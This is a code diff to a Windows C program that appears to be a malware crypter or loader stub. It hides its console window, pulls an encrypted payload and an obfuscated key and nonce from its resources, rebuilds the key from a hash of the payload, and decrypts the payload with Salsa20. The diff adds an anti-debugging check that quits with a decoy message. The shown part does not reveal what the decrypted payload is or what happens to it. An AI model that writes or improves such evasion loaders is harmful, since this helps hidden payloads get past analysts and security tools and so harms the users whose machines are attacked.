@@ -29,7 +29,13 @@ int main()
 {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    //stub, if no key or/and nonce found 
+    if (IsDebuggerPresent())
+    {
+        OutputDebugStringA("Oops! Unexpected failure.");
+        return 1;
+    }
+
+    // stub
     unsigned char key[32] = {0}; 
     unsigned char nonce[8] = {0}; 
 
@@ -39,14 +45,17 @@ int main()
     unsigned char* hashedKeyResPtr = GetResource(133, RT_RCDATA, &keySize);
     unsigned char* hashedNonceResPtr = GetResource(134, RT_RCDATA, &nonceSize);
 
-    if (payloadResPtr == NULL || payloadSize == 0)
+    if ((payloadResPtr == NULL || payloadSize == 0) || 
+       (hashedKeyResPtr == NULL || keySize == 0) || 
+       (hashedNonceResPtr == NULL || nonceSize == 0))
     {
-        // No encrypted payload found
+        // No payload/key/nonce found
         return 1;
     }
 
     uint32_t counter = 0;
     
+    // Calculating hash of payload. If it was changed then decryption will be wrong.
     unsigned char *data = (unsigned char*)payloadResPtr;
     unsigned char hash[SHA1_BLOCK_SIZE];
     SHA1(data, payloadSize, hash);
@@ -56,9 +65,10 @@ int main()
     | ((unsigned long)hash[2] << 16) 
     | ((unsigned long)hash[3] << 24);
 
-    //generate value
+    // Generate LCG value
     unsigned long LCG_Result = lcg_rand(&state);
 
+    // Deobfuscation
     for (int i = 0; i < 32; i++)
         key[i] = hashedKeyResPtr[i] ^ ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
     for (int i = 0; i < 8; i++)
@@ -76,6 +86,7 @@ int main()
     memcpy(decrypted, payloadResPtr, payloadSize);
     salsa20_crypt(decrypted, (uint32_t)payloadSize, key, nonce, counter);
 
+    // Obfuscation
     for (int i = 0; i < 32; i++)
         key[i] ^= ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
     for (int i = 0; i < 8; i++)
